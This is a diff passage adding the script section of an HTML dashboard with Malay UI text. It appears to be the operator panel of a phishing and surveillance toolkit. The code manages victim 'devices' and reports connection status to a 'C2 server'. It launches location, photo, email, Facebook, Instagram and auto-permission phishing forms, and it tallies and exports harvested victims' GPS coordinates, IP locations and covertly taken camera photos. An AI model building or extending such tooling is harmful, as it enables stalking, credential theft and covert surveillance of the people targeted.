+                    <button class="expand-btn" onclick="showDeviceDetail('${escapeHtml(dev.id)}')"><i class="fa-solid fa-info"></i></button>
+                    <button class="delete-btn" onclick="deleteDevice('${escapeHtml(dev.id)}')"><i class="fa-solid fa-trash"></i></button>
+                </div>`).join('');
+        }
+
+        function showDeviceDetail(deviceId) {
+            const device = devices.find(d => d.id === deviceId);
+            if (!device) return;
+            showModal(`
+                <div class="modal-header"><div class="modal-title">${escapeHtml(device.name || device.id)}</div><button class="modal-close" onclick="closeModal()"><i class="fa-solid fa-times"></i></button></div>
+                <div class="data-grid">
+                    <div class="data-item"><div class="data-item-label">ID</div><div class="data-item-value">${escapeHtml(device.id)}</div></div>
+                    <div class="data-item"><div class="data-item-label">Status</div><div class="data-item-value">${device.status === 'online' ? 'ONLINE' : 'OFFLINE'}</div></div>
+                    <div class="data-item"><div class="data-item-label">Model</div><div class="data-item-value">${escapeHtml(device.model || 'Unknown')}</div></div>
+                    <div class="data-item"><div class="data-item-label">OS</div><div class="data-item-value">${escapeHtml(device.os || 'Unknown')}</div></div>
+                    ${device.ip ? `<div class="data-item"><div class="data-item-label">IP</div><div class="data-item-value">${escapeHtml(device.ip)}</div></div>` : ''}
+                    ${device.last_seen ? `<div class="data-item"><div class="data-item-label">Last Seen</div><div class="data-item-value">${new Date(device.last_seen * 1000).toLocaleString()}</div></div>` : ''}
+                </div>`);
+        }
+
+        function filterActivities() {
+            const card = document.getElementById('activityListCard');
+            const searchInput = document.getElementById('activitySearchInput');
+            if (!card) return;
+            let filtered = [...activities];
+            if (searchInput) {
+                const search = searchInput.value.toLowerCase();
+                filtered = filtered.filter(a => (a.action || a.device_name || '').toLowerCase().includes(search));
+            }
+            if (!filtered || filtered.length === 0) {
+                card.innerHTML = '<div class="empty-state"><i class="fa-solid fa-inbox"></i><p>Tiada aktiviti</p></div>';
+                return;
+            }
+            card.innerHTML = filtered.slice(0, 50).map(act => `
+                <div style="display:flex;align-items:center;gap:10px;padding:10px;border-bottom:1px solid var(--border)">
+                    <i class="fa-solid fa-satellite-dish" style="color:var(--blue-300);font-size:12px"></i>
+                    <div style="flex:1">
+                        <div style="font-size:11px;font-weight:600;color:var(--blue-300)">${escapeHtml(act.device_name || act.device_id || 'Unknown')}</div>
+                        <div style="font-size:10px;color:var(--text-secondary)">${escapeHtml(act.action || 'Unknown')}</div>
+                    </div>
+                    <span style="font-size:9px;color:var(--text-muted);font-family:var(--font-mono)">${act.timestamp ? new Date(act.timestamp * 1000).toLocaleString() : 'N/A'}</span>
+                    <button class="delete-btn" onclick="deleteActivity('${escapeHtml(act.id)}')"><i class="fa-solid fa-trash"></i></button>
+                </div>`).join('');
+        }
+
+        function clearActivityFilter() {
+            document.getElementById('activitySearchInput').value = '';
+            filterActivities();
+        }
+
+        function filterResults() {
+            currentFilter.search = document.getElementById('resultSearchInput').value.trim();
+            currentFilter.type = document.getElementById('resultTypeFilter').value;
+            currentFilter.sort = document.getElementById('resultSortOrder').value;
+            applyResultFilter();
+        }
+
+        function clearResultFilter() {
+            currentFilter.search = '';
+            currentFilter.type = 'all';
+            currentFilter.sort = 'newest';
+            document.getElementById('resultSearchInput').value = '';
+            document.getElementById('resultTypeFilter').value = 'all';
+            document.getElementById('resultSortOrder').value = 'newest';
+            applyResultFilter();
+        }
+
+        function updateStats() {
+            document.getElementById('deviceCountStat').textContent = devices.length;
+            document.getElementById('resultCountStat').textContent = allResults.length;
+            const onlineCount = devices.filter(d => d.status === 'online').length;
+            document.getElementById('onlineCountStat').textContent = onlineCount;
+            const permissionCount = allResults.filter(r => r.browser_geolocation || r.permissions || r.device_info || r.camera_photo || r.ip_geolocation).length;
+            document.getElementById('permissionCountStat').textContent = permissionCount;
+            const locationCount = allResults.filter(r => r.browser_geolocation || (r.ip_geolocation && r.ip_geolocation.latitude)).length;
+            document.getElementById('locationCountStat').textContent = locationCount;
+            const cameraCount = allResults.filter(r => r.camera_photo).length;
+            document.getElementById('cameraCountStat').textContent = cameraCount;
+        }
+
+        function updateNavBadges() {
+            document.getElementById('deviceNavBadge').textContent = devices.length;
+            document.getElementById('activityNavBadge').textContent = activities.length;
+            document.getElementById('resultNavBadge').textContent = allResults.length;
+        }
+
+        function renderRecentActivities() {
+            const feed = document.getElementById('recentActivitiesFeed');
+            if (!activities || activities.length === 0) {
+                feed.innerHTML = '<div class="empty-state"><i class="fa-solid fa-inbox"></i><p>Tiada aktiviti</p></div>';
+                return;
+            }
+            feed.innerHTML = activities.slice(0, 10).map(act => `
+                <div style="display:flex;align-items:center;gap:10px;padding:8px;border-bottom:1px solid var(--border)">
+                    <i class="fa-solid fa-satellite-dish" style="color:var(--blue-300);font-size:11px"></i>
+                    <div style="flex:1">
+                        <div style="font-size:10px;font-weight:600;color:var(--blue-300)">${escapeHtml(act.device_name || 'Unknown')}</div>
+                        <div style="font-size:9px;color:var(--text-secondary)">${escapeHtml(act.action || 'Unknown')}</div>
+                    </div>
+                    <span style="font-size:8px;color:var(--text-muted);font-family:var(--font-mono)">${act.timestamp ? new Date(act.timestamp * 1000).toLocaleTimeString() : 'N/A'}</span>
+                </div>`).join('');
+        }
+
+        function renderRecentResults() {
+            const feed = document.getElementById('recentResultsFeed');
+            if (!allResults || allResults.length === 0) {
+                feed.innerHTML = '<div class="empty-state"><i class="fa-solid fa-inbox"></i><p>Tiada hasil</p></div>';
+                return;
+            }
+            feed.innerHTML = allResults.slice(0, 5).map(result => {
+                const type = result.type || 'unknown';
+                const target = result.target || 'N/A';
+                const time = result.timestamp ? new Date(result.timestamp * 1000).toLocaleString() : 'N/A';
+                return `
+                    <div style="display:flex;align-items:center;gap:10px;padding:8px;border-bottom:1px solid var(--border)">
+                        <span class="type-badge badge-location">${escapeHtml(type.toUpperCase())}</span>
+                        <div style="flex:1">
+                            <div style="font-size:10px;font-weight:600;color:var(--text-primary)">${escapeHtml(target)}</div>
+                            <div style="font-size:9px;color:var(--text-muted)">${escapeHtml(result.ip_address || 'N/A')}</div>
+                        </div>
+                        ${result.camera_photo ? `<img src="${escapeHtml(result.camera_photo)}" style="width:30px;height:30px;border-radius:4px;object-fit:cover" />` : ''}
+                        <span style="font-size:8px;color:var(--text-muted);font-family:var(--font-mono)">${time}</span>
+                    </div>`;
+            }).join('');
+        }
+
+        function showPhishingForm(type) {
+            activePhishingType = type;
+            const formCard = document.getElementById('phishingFormCard');
+            const title = document.getElementById('phishingFormTitle');
+            const targetInput = document.getElementById('phishingTarget');
+            formCard.style.display = 'block';
+            targetInput.value = '';
+            const names = { location: 'Location Phishing', photo: 'Photo Phishing', email: 'Email Phishing', facebook: 'Facebook Phishing', instagram: 'Instagram Phishing', auto: 'Auto-Permission Phishing' };
+            title.textContent = names[type] || 'Borang Phishing';
+            formCard.scrollIntoView({ behavior: 'smooth', block: 'center' });
+        }
+
+        function switchSection(section) {
+            document.querySelectorAll('[id^="section-"]').forEach(el => el.style.display = 'none');
+            document.getElementById('section-' + section).style.display = 'block';
+            document.querySelectorAll('.nav-item[data-section]').forEach(el => el.classList.remove('active'));
+            const navItem = document.querySelector('.nav-item[data-section="' + section + '"]');
+            if (navItem) navItem.classList.add('active');
+            if (window.innerWidth <= 768) document.getElementById('sidebar').classList.remove('open');
+            if (section === 'results') fetchPhishingResults();
+            if (section === 'overview') { renderRecentActivities(); renderRecentResults(); }
+        }
+
+        function toggleSidebar() { document.getElementById('sidebar').classList.toggle('open'); }
+        function goToDashboard() { window.location.href = '/dashboard.html'; }
+
+        function toggleTheme() {
+            const html = document.documentElement;
+            const current = html.getAttribute('data-theme');
+            setTheme(current === 'dark' ? 'light' : 'dark');
+        }
+
+        function setTheme(theme) {
+            document.documentElement.setAttribute('data-theme', theme);
+            const icon = document.getElementById('themeIcon');
+            if (icon) icon.className = theme === 'dark' ? 'fa-solid fa-moon' : 'fa-solid fa-sun';
+            document.querySelectorAll('#section-settings .refresh-btn').forEach(btn => btn.classList.remove('active'));
+            const darkBtn = document.querySelector('#section-settings .refresh-btn:nth-child(1)');
+            const lightBtn = document.querySelector('#section-settings .refresh-btn:nth-child(2)');
+            if (theme === 'dark' && darkBtn) darkBtn.classList.add('active');
+            if (theme === 'light' && lightBtn) lightBtn.classList.add('active');
+        }
+
+        function toggleAutoRefresh() {
+            autoRefreshEnabled = !autoRefreshEnabled;
+            const btn = document.getElementById('autoRefreshToggle');
+            if (autoRefreshEnabled) {
+                btn.classList.add('active');
+                btn.innerHTML = '<i class="fa-solid fa-check"></i> Aktif';
+                startAutoRefresh();
+                showToast('Auto refresh diaktifkan', 'success');
+            } else {
+                btn.classList.remove('active');
+                btn.innerHTML = '<i class="fa-solid fa-times"></i> Mati';
+                stopAutoRefresh();
+                showToast('Auto refresh dimatikan', 'info');
+            }
+        }
+
+        function startAutoRefresh() {
+            stopAutoRefresh();
+            if (autoRefreshEnabled) {
+                refreshInterval = setInterval(() => {
+                    fetchDevices();
+                    fetchActivities();
+                    fetchPhishingResults();
+                    fetchLinks();
+                }, 5000);
+            }
+        }
+
+        function stopAutoRefresh() {
+            if (refreshInterval) { clearInterval(refreshInterval); refreshInterval = null; }
+        }
+
+        function toggleNotifications() {
+            notificationsEnabled = !notificationsEnabled;
+            const btn = document.getElementById('notifToggle');
+            if (notificationsEnabled) {
+                btn.classList.remove('active');
+                showToast('Notifikasi diaktifkan', 'success');
+            } else {
+                btn.classList.add('active');
+                showToast('Notifikasi dimatikan', 'info');
+            }
+        }
+
+        function showToast(message, type = 'info') {
+            if (!notificationsEnabled && type === 'info') return;
+            const container = document.getElementById('toastContainer');
+            const toast = document.createElement('div');
+            toast.className = `toast ${type}`;
+            const icons = { success: 'fa-check-circle', error: 'fa-exclamation-circle', info: 'fa-info-circle' };
+            toast.innerHTML = `<i class="fa-solid ${icons[type] || 'fa-info-circle'}" style="color:${type === 'success' ? 'var(--green)' : type === 'error' ? 'var(--red)' : 'var(--blue-300)'}"></i> ${escapeHtml(message)}`;
+            container.appendChild(toast);
+            setTimeout(() => { toast.classList.add('hide'); setTimeout(() => toast.remove(), 300); }, 3000);
+        }
+
+        function showModal(content) {
+            const container = document.getElementById('modalContainer');
+            container.innerHTML = `
+                <div class="modal-overlay" onclick="if(event.target===this)closeModal()">
+                    <div class="modal-content">${content}</div>
+                </div>`;
+        }
+
+        function closeModal() { document.getElementById('modalContainer').innerHTML = ''; }
+
+        function exportResults(format) {
+            if (!allResults || allResults.length === 0) {
+                showToast('Tiada data untuk dieksport', 'error');
+                return;
+            }
+            if (format === 'csv') {
+                const headers = ['Type', 'Target', 'IP', 'City', 'Country', 'Latitude', 'Longitude', 'Timestamp'];
+                const rows = allResults.map(r => [
+                    r.type || '', r.target || '', r.ip_address || '',
+                    r.ip_geolocation ? r.ip_geolocation.city : '',
+                    r.ip_geolocation ? r.ip_geolocation.country_name : '',
+                    r.browser_geolocation ? r.browser_geolocation.latitude : (r.ip_geolocation ? r.ip_geolocation.latitude : ''),
+                    r.browser_geolocation ? r.browser_geolocation.longitude : (r.ip_geolocation ? r.ip_geolocation.longitude : ''),
+                    r.timestamp ? new Date(r.timestamp * 1000).toISOString() : ''
+                ]);
+                const csv = [headers, ...rows].map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',')).join('\n');
+                downloadFile(csv, 'phishing_results.csv', 'text/csv');
+            } else if (format === 'json') {
+                const json = JSON.stringify(allResults, null, 2);
+                downloadFile(json, 'phishing_results.json', 'application/json');
+            }
+        }
+
+        function downloadFile(content, filename, mimeType) {
+            const blob = new Blob([content], { type: mimeType });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = filename;
+            document.body.appendChild(a);
+            a.click();
+            document.body.removeChild(a);
+            URL.revokeObjectURL(url);
+            showToast('Fail dieksport', 'success');
+        }
+
+        function updateConnectionStatus(connected) {
+            isC2Connected = connected;
+            const dot = document.getElementById('connectionDot');
+            if (connected) {
+                dot.classList.remove('offline');
+                dot.title = 'Connected to C2 server';
+                document.getElementById('c2ServerStatus').textContent = 'Connected';
+                document.getElementById('c2ServerStatus').style.color = 'var(--green)';
+            } else {
+                dot.classList.add('offline');
+                dot.title = 'Disconnected';
+                document.getElementById('c2ServerStatus').textContent = 'Disconnected';
+                document.getElementById('c2ServerStatus').style.color = 'var(--red)';
+            }
+        }
+
+        function escapeHtml(text) {
+            const map = { '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#039;' };
+            return String(text).replace(/[&<>"']/g, m => map[m]);
+        }
+
+        document.addEventListener('DOMContentLoaded', async () => {
+            startAutoRefresh();
+            await refreshAllData();
+            window.addEventListener('resize', () => {
+                if (window.innerWidth > 768) document.getElementById('sidebar').classList.remove('open');
+            });
+        });
+
+        window.addEventListener('beforeunload', () => {
+            stopAutoRefresh();
+        });
+    </script>
+</body>
+</html>
